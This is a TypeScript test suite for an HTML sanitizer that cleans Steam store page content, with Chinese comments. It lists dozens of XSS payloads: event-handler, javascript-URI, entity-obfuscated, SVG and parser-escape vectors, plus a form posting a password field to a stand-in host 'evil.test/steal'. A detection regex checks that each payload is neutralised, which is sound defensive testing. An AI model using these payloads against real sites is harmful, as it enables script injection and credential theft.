import assert from 'node:assert/strict'
import test from 'node:test'
import { sanitizeHtml, stripToText } from '../../backend/sanitize.ts'

const token = (url: string) => `img:${Buffer.from(url).toString('base64url')}`
const clean = (html: string) => sanitizeHtml(html, { imageToken: token })

/** 输出里绝不应出现的特征：可执行脚本、事件属性、危险协议、可劫持页面的标签 */
const DANGEROUS = /<\s*(script|iframe|object|embed|style|link|meta|base|form|template|svg|math|noscript|input|textarea|select)\b|\son[a-z]+\s*=|javascript\s*:|vbscript\s*:|data:text\/html|expression\s*\(|formaction|srcdoc|<\?|<!\[|\bstyle\s*=|\s(?:id|name)\s*=/i

/** 把实体编码还原后再判一次，模拟浏览器的解析 */
const asBrowserSees = (html: string) => html
  .replace(/&#x([0-9a-f]+);?/gi, (_, hex: string) => String.fromCodePoint(parseInt(hex, 16)))
  .replace(/&#(\d+);?/g, (_, dec: string) => String.fromCodePoint(parseInt(dec, 10)))
  .replace(/&#(\d+);/g, (_, dec: string) => String.fromCodePoint(parseInt(dec, 10)))

const VECTORS: Array<[string, string]> = [
  ['script 配对标签', '<p>ok</p><script>alert(1)</script>'],
  ['script 外链', '<SCRIPT SRC="https://evil.test/x.js"></SCRIPT>'],
  ['script 嵌套干扰', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
  ['未闭合的 script', '<p>a</p><script>alert(1)'],
  ['img onerror', '<img src="https://x.test/a.jpg" onerror="alert(1)">'],
  ['img onerror 无引号', '<img src=https://x.test/a.jpg onerror=alert(1)>'],
  ['img onerror 大小写混合', '<img src="https://x.test/a.jpg" OnErRoR=alert(1)>'],
  ['img onerror 换行', '<img src="https://x.test/a.jpg" onerror\n=alert(1)>'],
  ['svg onload', '<svg onload=alert(1)><circle r=1/></svg>'],
  ['body onload', '<body onload=alert(1)>'],
  ['details ontoggle', '<details open ontoggle=alert(1)>'],
  ['div onmouseover', '<div onmouseover="alert(1)">hover</div>'],
  ['div 换行 onclick', '<div\nonclick=alert(1)>x</div>'],
  ['div tab onfocus', '<div\tonfocus=alert(1)>x</div>'],
  ['允许标签里藏事件', '<div><p><strong onmouseover=alert(1)>x</strong></p></div>'],
  ['大写标签与属性', '<DIV ONCLICK=alert(1)><A HREF="JAVASCRIPT:alert(1)">x</A></DIV>'],
  ['iframe', '<iframe src="https://evil.test"></iframe>'],
  ['iframe javascript', '<iframe src="javascript:alert(1)"></iframe>'],
  ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ['object / embed', '<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/x.swf">'],
  ['a href javascript', '<a href="javascript:alert(1)">点我</a>'],
  ['a href 混合大小写', '<a href="JaVaScRiPt:alert(1)">点我</a>'],
  ['a href 协议里夹 tab', '<a href="jav\tascript:alert(1)">点我</a>'],
  ['a href 协议里夹换行', '<a href="java\nscript:alert(1)">点我</a>'],
  ['a href 协议前空白', '<a href="   javascript:alert(1)">点我</a>'],
  ['a href 实体编码十进制', '<a href="&#106;avascript:alert(1)">点我</a>'],
  ['a href 实体编码十六进制', '<a href="&#x6A;avascript:alert(1)">点我</a>'],
  ['a href 实体编码冒号', '<a href="javascript&colon;alert(1)">点我</a>'],
  ['a href 实体 tab', '<a href="jav&tab;ascript:alert(1)">点我</a>'],
  ['a href 控制字符前缀', '<a href="\u0001javascript:alert(1)">点我</a>'],
  ['a href vbscript', '<a href="vbscript:msgbox(1)">点我</a>'],
  ['a href data:text/html', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">点我</a>'],
  ['a href file 协议', '<a href="file:///C:/Windows/system32">点我</a>'],
  ['a href 自定义协议', '<a href="intent://x/#Intent;end">点我</a>'],
  ['form 与密码框', '<form action="https://evil.test/steal"><input name=pw type=password></form>'],
  ['button formaction', '<button formaction="javascript:alert(1)">x</button>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
  ['base 劫持', '<base href="https://evil.test/">'],
  ['style 元素', '<style>@import url(https://evil.test/x.css);</style>'],
  ['style 未闭合', '<style>body{background:url(javascript:alert(1))}'],
  ['style 属性 expression', '<div style="width: expression(alert(1))">x</div>'],
  ['style 属性 url javascript', '<div style="background:url(javascript:alert(1))">x</div>'],
  ['img src javascript', '<img src="javascript:alert(1)">'],
  ['img src data URI', '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'],
  ['svg 整体含 script', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
  ['svg animate href', '<svg><animate attributeName=href values=javascript:alert(1) /><a><text>x</text></a></svg>'],
  ['xlink:href javascript', '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>'],
  ['math 嵌套逃逸', '<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>'],
  ['template', '<template><script>alert(1)</script></template>'],
  ['noscript', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
  ['条件编译注释', '<!--[if IE]><script>alert(1)</script><![endif]-->'],
  ['CDATA', '<![CDATA[<script>alert(1)</script>]]>'],
  ['处理指令', '<?php system("x") ?><?xml-stylesheet href="javascript:alert(1)"?>'],
  ['NUL 字节拆分', '<img src="https://x.test/a.jpg" onerror\u0000=alert(1)>'],
  ['属性值逃逸引号', '<img src="https://x.test/a.jpg" alt="a\\" onerror=\\"alert(1)">'],
  ['title 注入新属性', '<a href="https://x.test" title="x\\" onclick=\\"alert(1)">y</a>'],
  ['img src 引号逃逸', '<img src="https://x.test/a.jpg\\" onerror=\\"alert(1)">'],
  ['DOM clobbering id/name', '<img id="attributes"><a name="body">x</a>'],
  ['data-* 属性', '<div data-x="1" data-onclick="alert(1)">x</div>'],
  ['input / textarea / select', '<input value="x"><textarea>x</textarea><select><option>a</option></select>'],
]

test('所有 XSS 向量净化后都不残留可执行内容', () => {
  const leaked: string[] = []
  for (const [name, payload] of VECTORS) {
    const out = clean(payload)
    if (DANGEROUS.test(out) || DANGEROUS.test(asBrowserSees(out))) leaked.push(`${name} → ${out.slice(0, 100)}`)
  }
  assert.deepEqual(leaked, [], `以下向量泄漏：\n${leaked.join('\n')}`)
})

test('正常内容完整保留，结构不被破坏', () => {
  const source = '<h2>游戏介绍</h2><p>一款<strong>开放世界</strong>作品，含 <em>中文</em>与 <code>game.exe</code>。</p>'
    + '<ul><li>特色一</li><li>特色二</li></ul><ol><li>步骤</li></ol>'
    + '<img src="https://shared.st.dl.eccdnx.com/store_item_assets/steam/apps/1/abc" alt="截图">'
    + '<a href="https://store.steampowered.com/app/1">官网</a>'
    + '<blockquote>引用</blockquote><pre><code>const x = 1</code></pre><br><hr><table><tr><td>单元格</td></tr></table>'
  const out = clean(source)
  for (const expected of ['<h2>游戏介绍</h2>', '<strong>开放世界</strong>', '<em>中文</em>', '<code>game.exe</code>', '<li>特色二</li>', '<ol><li>步骤</li></ol>', 'alt="截图"', '<blockquote>引用</blockquote>', '<br>', '<hr>', '<td>单元格</td>']) {
    assert.ok(out.includes(expected), `应保留：${expected}\n实际：${out}`)
  }
  assert.ok(out.includes(`src="${token('https://shared.st.dl.eccdnx.com/store_item_assets/steam/apps/1/abc')}"`), '图片地址应换成令牌')
  assert.ok(/<a href="https:\/\/store\.steampowered\.com\/app\/1" rel="noopener noreferrer" target="_blank">官网<\/a>/.test(out), '外链应保留并加 noopener')
})

test('Steam 商店排版类名保留，其它 class 丢弃', () => {
  const out = clean('<h2 class="bb_tag">标题</h2><p class="bb_paragraph  unknown-class">段落</p><div class="x" onclick="alert(1)">d</div>')
  assert.ok(out.includes('<h2 class="bb_tag">标题</h2>'))
  assert.ok(out.includes('<p class="bb_paragraph">段落</p>'), out)
  assert.ok(!out.includes('unknown-class') && !out.includes('class="x"'))
})

test('文本里的尖括号与 & 只转义一层，不会在输出里复活成标签', () => {
  const out = clean('<p>1 &lt; 2 &amp; 3 &gt; 2</p><p>原样 <b>加粗</b></p><p title="a&quot;b">t</p>')
  assert.equal(out, '<p>1 &lt; 2 &amp; 3 &gt; 2</p><p>原样 <b>加粗</b></p><p>t</p>')
  // 被转义成文本的"标签"仍然是文本：解码一层后看到的是 &lt;img …&gt;，而不是 <img …>
  const trick = clean('<p>&lt;img src=x onerror=alert(1)&gt;</p>')
  assert.equal(trick, '<p>&lt;img src=x onerror=alert(1)&gt;</p>')
  assert.ok(!/<img/.test(trick), '不能出现真正的 img 标签：' + trick)
  // 属性里的引号被转义，无法逃出属性（逐个属性核对，不依赖输出顺序）
  const attr = clean('<a href="https://x.test" title="a&quot; onclick=&quot;alert(1)">y</a>')
  assert.equal(attr, '<a href="https://x.test" rel="noopener noreferrer" target="_blank" title="a&quot; onclick=&quot;alert(1)">y</a>')
  assert.equal((attr.match(/<a\b/g) || []).length, 1)
  assert.ok(!/\sonclick=/.test(attr.replace(/title="[^"]*"/, '')), 'onclick 只能出现在 title 的值里：' + attr)
})

test('未闭合的标签会被补齐，输出是良构的', () => {
  const out = clean('<div><p>段落<strong>加粗')
  assert.equal(out, '<div><p>段落<strong>加粗</strong></p></div>')
  const voidOnly = clean('<br><hr><img src="https://x.test/a.png">')
  assert.equal(voidOnly, '<br><hr><img src="https://x.test/a.png">'.replace('https://x.test/a.png', token('https://x.test/a.png')))
})

test('被丢弃容器内的内容整体消失，不留下半截', () => {
  assert.equal(clean('<p>a</p><script>alert(1)</script><p>b</p>'), '<p>a</p><p>b</p>')
  assert.equal(clean('<table><tr><td>x</td></tr></table><form><button formaction="javascript:alert(1)">x</button></form>'), '<table><tr><td>x</td></tr></table>')
})

test('链接改写与空地址处理', () => {
  const out = sanitizeHtml('<a href="https://x.test/a">x</a><a href="">空</a><a href="javascript:alert(1)">坏</a>', { linkHref: url => `https://safe.test/r?u=${encodeURIComponent(url)}` })
  assert.ok(out.includes('href="https://safe.test/r?u=https%3A%2F%2Fx.test%2Fa"'))
  assert.ok(!out.includes('href=""') && !out.includes('javascript'))
  // 没有 imageToken 时图片 src 被丢弃而不是原样输出
  const noToken = sanitizeHtml('<img src="https://x.test/a.png" alt="图">')
  assert.equal(noToken, '<img alt="图">')
})

test('超长输入被截断，NUL 被移除', () => {
  const big = '<p>' + 'x'.repeat(3_000_000) + '</p>'
  assert.ok(clean(big).length < 2_100_000)
  assert.ok(!clean('<p>a\u0000b</p>').includes('\u0000'))
})

/* ---------------- 正文视频 ---------------- */

const vtoken = (url: string) => `video:${Buffer.from(url).toString('base64url')}`
const video = (html: string) => sanitizeHtml(html, { imageToken: token, videoToken: vtoken })

test('没有视频令牌解析器时，video 与 source 连同内容整体丢弃', () => {
  const out = clean('<p>a</p><video src="https://x.test/v.mp4" autoplay onplay="alert(1)"><source src="https://x.test/v.webm" type="video/webm">fallback</video><p>b</p>')
  assert.equal(out, '<p>a</p><p>b</p>')
})

test('正文视频：地址换成令牌，只保留播放相关属性，强制去掉 autoplay 并加上 controls', () => {
  const out = video('<video class="bb_img" autoplay muted loop playsinline poster="https://x.test/p.jpg" width="600" height="100" onerror="alert(1)" data-x="1" src="https://x.test/v.mp4"></video>')
  assert.ok(out.startsWith('<video ') && out.endsWith('</video>'))
  assert.ok(out.includes(`src="${vtoken('https://x.test/v.mp4')}"`), 'src 应为视频令牌')
  assert.ok(out.includes(`poster="${token('https://x.test/p.jpg')}"`), 'poster 应为图片令牌')
  assert.ok(out.includes(' width="600" height="100"'), '尺寸保留')
  for (const attr of [' muted', ' loop', ' playsinline', ' controls', ' preload="none"', 'class="bb_img"']) assert.ok(out.includes(attr), '应保留 ' + attr)
  assert.ok(!/\sautoplay/.test(out), 'autoplay 必须去掉')
  assert.ok(!/\son[a-z]+\s*=/.test(out) && !/data-x/.test(out), '事件与未知属性必须去掉')
})

test('正文视频：source 按 MIME 过滤，拿不到绝对地址的不输出', () => {
  // 属性值里的引号要写成实体：type="video/webm; codecs=&quot;vp9&quot;" 才是合法 HTML
  const out = video('<video><source src="https://x.test/a.webm" type="video/webm; codecs=&quot;vp9&quot;"><source src="https://x.test/b.mp4" type="text/html"><source src="/relative.mp4"><source src="javascript:alert(1)"><source src="data:video/mp4;base64,AAAA"></video>')
  assert.ok(out.includes(`<source src="${vtoken('https://x.test/a.webm')}" type="video/webm; codecs=&quot;vp9&quot;"`), 'webm source 保留')
  assert.equal(out.match(/<source/g)?.length, 1, '只有一个 source 被保留')
  assert.ok(!out.includes('text/html') && !out.includes('relative.mp4') && !out.includes('javascript') && !out.includes('data:'))
  // type 写成了非法 MIME（text/html）的 source 即便有地址也不输出
  assert.equal(video('<video><source src="https://x.test/a.webm" type="text/html"></video>'), '')
  // 属性值被裸引号截断的畸形输入：type 不合法，source 不输出，也不会把后面的内容当成属性
  const broken = video('<video><source src="https://x.test/a.webm" type="video/webm; codecs="vp9" onerror="alert(1)"></video>')
  assert.ok(!broken.includes('onerror') && !broken.includes('<source'), '畸形 type 的 source 不输出')
})

test('正文视频：站点实际的写法 webm + mp4 两个 source 都保留（codecs 不带引号）', () => {
  // 这是 Steam 商店正文里的真实结构：<source type="video/webm; codecs=vp9"> 在前、mp4 在后
  const out = video('<video class="bb_img" autoplay muted loop playsinline poster="https://x.test/p.avif" width=800 height=368><source src="https://x.test/a.webm" type="video/webm; codecs=vp9"><source src="https://x.test/a.mp4" type="video/mp4"></video>')
  assert.ok(out.includes(`<source src="${vtoken('https://x.test/a.webm')}" type="video/webm; codecs=&quot;vp9&quot;">`), 'webm source 应保留')
  assert.ok(out.includes(`<source src="${vtoken('https://x.test/a.mp4')}" type="video/mp4">`), 'mp4 source 应保留')
  assert.equal(out.match(/<source/g)?.length, 2)
  assert.ok(!/\sautoplay/.test(out) && out.includes(' muted') && out.includes(' loop'), 'autoplay 去掉，muted / loop 保留')
  assert.ok(out.includes(`poster="${token('https://x.test/p.avif')}"`), 'AVIF 封面保留')
})

test('正文视频：没有任何可用地址的 video 不输出空控件', () => {
  assert.equal(video('<p>a</p><video src="/relative.mp4">x</video><video><source src="/rel.webm"></video><p>b</p>'), '<p>a</p><p>b</p>')
  // 只有 poster 没有 src 的 video 也不输出
  assert.equal(video('<video poster="https://x.test/p.jpg"></video>'), '')
})

test('正文视频：XSS 向量在 video/source 上同样被拦', () => {
  const vectors = [
    '<video src="javascript:alert(1)">',
    '<video src="data:text/html,<script>alert(1)</script>">',
    '<video><source src="x" onerror="alert(1)"></video>',
    '<video onloadstart="alert(1)" src="https://x.test/v.mp4"></video>',
    '<video src="https://x.test/v.mp4"><track src="x" onerror="alert(1)"></video>',
    '<video src="https://x.test/v.mp4"><script>alert(1)</script></video>',
    '<video src="&#106;avascript:alert(1)">',
    '<video src="jav\tascript:alert(1)">',
    '<source src="https://x.test/v.mp4" type="video/mp4&quot; onerror=&quot;alert(1)">',
    '<video src="https://x.test/v.mp4" style="background:url(javascript:alert(1))"></video>',
  ]
  for (const vector of vectors) {
    const out = video(vector)
    assert.ok(!DANGEROUS.test(out) && !DANGEROUS.test(asBrowserSees(out)), `泄漏：${vector} → ${out}`)
  }
})

test('stripToText 去掉标签只留文本，脚本内容丢弃', () => {
  assert.equal(stripToText('<h2>标题</h2><p>一段<br>文字 &amp; 符号</p><script>alert(1)</script>'), '标题 一段 文字 & 符号')
  assert.equal(stripToText(''), '')
})
